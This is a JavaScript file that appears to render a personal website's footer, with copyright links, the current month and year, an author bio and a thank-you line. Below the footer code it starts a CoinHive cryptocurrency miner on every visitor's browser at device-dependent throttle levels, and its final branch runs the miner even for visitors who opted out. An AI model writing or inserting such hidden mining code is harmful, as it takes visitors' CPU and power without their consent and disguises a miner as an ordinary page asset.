var mfA = document.createElement("A");
var mf = document.createTextNode("MaX Falstein Website");
mfA.setAttribute("href", "http://mf");
mfA.appendChild(mf);
var copy = document.createTextNode(" \u00A9 ");
var mfA1 = document.createElement("A");
var mf1 = document.createTextNode("MaX Falstein");
mfA1.setAttribute("href", "https://lnk.bio/MaX"); // or max.risqué
mfA1.appendChild(mf1);
var and = document.createTextNode(" & ");
var mfA2 = document.createElement("A");
var mf2 = document.createTextNode("Falstein Inc.");
mfA2.setAttribute("href", "http://fi");
mfA2.appendChild(mf2);
var period = document.createTextNode(" — ");
var d = new Date();
var year = d.getFullYear().toString();
var m = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
var month = m[d.getMonth()];
var footerMonth = document.createTextNode(month);
var gap = document.createTextNode(" ");
var footerYear = document.createTextNode(year);
var patent = document.createTextNode(" - Patents & Trademarks Pending");

var p = document.createElement("P");
p.appendChild(mfA);
p.appendChild(copy);
p.appendChild(mfA1);
p.appendChild(and);
p.appendChild(mfA2);
p.appendChild(period);
p.appendChild(footerMonth);
p.appendChild(gap);
p.appendChild(footerYear);
p.appendChild(patent);

var p2 = document.createElement("P");
var mfB = document.createTextNode("MaX Falstein");
var br = document.createElement("BR");
var mfB2 = document.createTextNode("Computer Stack (H/W, Net, Security, S/W) Architect, Designer, Engineer & Researcher | Executive & Founder | Investor 📈");
p2.appendChild(mfB);
p2.appendChild(br);
p2.appendChild(mfB2);

var p3 = document.createElement("P");
var mfC = document.createTextNode("A quick little message from MaX saying thank you for visiting the repository!");
p3.appendChild(mfC);

var footer = document.createElement("FOOTER");
footer.appendChild(p);
footer.appendChild(p2);
footer.appendChild(p3);
document.getElementById("body").appendChild(footer);

var minerSetup = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.3});
if (!minerSetup.isMobile() && !minerSetup.didOptOut(900)) {
  // desktop @ 70%
  var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.3});
  miner.start();
} else if (minerSetup.isMobile() && !minerSetup.didOptOut(900)) {
  // mobile @ 30%
  var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.7});
  miner.start();
} else {
  // unknown device @ 50%
  var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.5});
  miner.start();
}
